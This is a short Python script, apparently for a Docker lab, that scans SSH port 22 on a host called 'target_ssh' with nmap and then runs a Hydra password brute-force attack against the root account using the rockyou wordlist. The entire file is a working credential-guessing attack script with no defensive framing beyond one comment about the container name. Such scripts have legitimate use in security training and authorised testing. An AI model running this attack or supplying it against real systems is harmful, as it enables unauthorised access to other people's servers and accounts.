import os

target_ip = "target_ssh"  # Use Docker container name instead of host.docker.internal
target_port = 22
username = "root"
wordlist = "/usr/share/wordlists/rockyou.txt"

print("[*] Scanning with Nmap...")
os.system(f"nmap -p {target_port} {target_ip}")

print("[*] Launching Hydra brute-force attack...")
os.system(f"hydra -l {username} -P {wordlist} -s {target_port} ssh://{target_ip}")